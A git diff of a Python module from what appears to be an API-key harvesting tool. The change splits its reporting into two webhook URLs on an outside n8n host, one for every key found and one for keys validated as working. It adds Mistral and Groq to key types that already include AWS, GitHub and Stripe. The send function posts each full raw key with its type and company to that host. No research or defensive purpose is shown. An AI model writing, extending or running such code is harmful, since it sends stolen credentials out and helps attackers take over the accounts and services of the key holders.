@@ -7,8 +7,9 @@ from typing import Optional
 
 logger = logging.getLogger(__name__)
 
-# Webhook URL
-WEBHOOK_URL = "https://n8n.goreview.fr/webhook-test/aworkingapikey"
+# Webhook URLs
+WEBHOOK_URL_FOUND = "https://n8n.goreview.fr/webhook-test/apikey"  # For all found keys
+WEBHOOK_URL_WORKING = "https://n8n.goreview.fr/webhook-test/workingkey"  # For working keys only
 
 # Map key types to company/service names
 KEY_TYPE_TO_COMPANY = {
@@ -20,6 +21,8 @@ KEY_TYPE_TO_COMPANY = {
     "perplexity": "Perplexity",
     "cohere": "Cohere",
     "pinecone": "Pinecone",
+    "mistral": "Mistral AI",
+    "groq": "Groq",
     "aws": "Amazon Web Services (AWS)",
     "github": "GitHub",
     "stripe": "Stripe",
@@ -37,14 +40,15 @@ def get_company_name(key_type: str) -> str:
     """
     return KEY_TYPE_TO_COMPANY.get(key_type, key_type.replace("_", " ").title())
 
-def send_webhook_notification(key: str, key_type: str, message: Optional[str] = None) -> bool:
+def send_webhook_notification(key: str, key_type: str, message: Optional[str] = None, is_working: bool = False) -> bool:
     """
-    Send a webhook notification when a working API key is found
+    Send a webhook notification when an API key is found
     
     Args:
-        key: The working API key
+        key: The API key found
         key_type: The type of API key (e.g., "openai_standard", "google_gemini")
         message: Optional validation message
+        is_working: Whether the key is validated and working (default: False)
         
     Returns:
         True if webhook was sent successfully, False otherwise
@@ -56,11 +60,15 @@ def send_webhook_notification(key: str, key_type: str, message: Optional[str] = 
             "key": key,
             "key_type": key_type,
             "company": company_name,
-            "message": message or "Valid API key found",
+            "is_working": is_working,
+            "message": message or ("Valid API key found" if is_working else "API key found"),
         }
         
+        # Use different webhook URL for working keys
+        webhook_url = WEBHOOK_URL_WORKING if is_working else WEBHOOK_URL_FOUND
+        
         response = requests.post(
-            WEBHOOK_URL,
+            webhook_url,
             json=payload,
             timeout=10,
             headers={"Content-Type": "application/json"}
